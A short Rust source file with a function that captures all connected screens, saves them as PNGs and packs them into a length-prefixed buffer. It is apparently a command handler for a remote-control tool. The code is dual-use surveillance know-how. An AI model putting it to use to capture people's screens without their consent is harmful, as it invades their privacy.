use std::io::Read;
use std::path::Path;
use anyhow::Result;
use bytes::{BufMut, BytesMut};
use screenshots::Screen;
use tempfile::tempdir;
use tokio::fs::read;
use tokio::task::JoinSet;
use variable_len_reader::str::{write_string, write_u8_vec};
use variable_len_reader::variable_len::write_variable_u32;

async fn capture(directory: &Path) -> Result<()> {
    let mut tasks = JoinSet::new();
    for screen in Screen::all()? {
        let mut path = directory.to_path_buf();
        tasks.spawn(async move {
            let image = screen.capture()?;
            path.push(format!("{}.png", screen.display_info.id));
            image.save(path)?;
            Ok(())
        });
    }
    while let Some(res) = tasks.join_next().await {
        let res: Result<()> = res?;
        res?;
    }
    Ok(())
}

pub async fn image_grab(_bytes: &mut impl Read) -> Result<BytesMut> {
    let temp = tempdir()?;
    let temp = temp.path();
    match capture(temp).await {
        Ok(()) => {
            let mut images = Vec::new();
            for dir in temp.read_dir()? {
                let dir = dir?;
                if dir.file_type()?.is_file() {
                    images.push(dir.path());
                }
            }
            let mut writer = BytesMut::new().writer();
            write_variable_u32(&mut writer, images.len() as u32)?;
            if images.is_empty() {
                write_string(&mut writer, &"No images.")?;
            } else {
                for image in images {
                    let buffer = read(image).await?;
                    write_u8_vec(&mut writer, &buffer)?;
                }
            }
            Ok(writer.into_inner())
        },
        Err(e) => {
            let mut writer = BytesMut::new().writer();
            write_variable_u32(&mut writer, 0)?;
            write_string(&mut writer, &e.to_string())?;
            Ok(writer.into_inner())
        },
    }
}
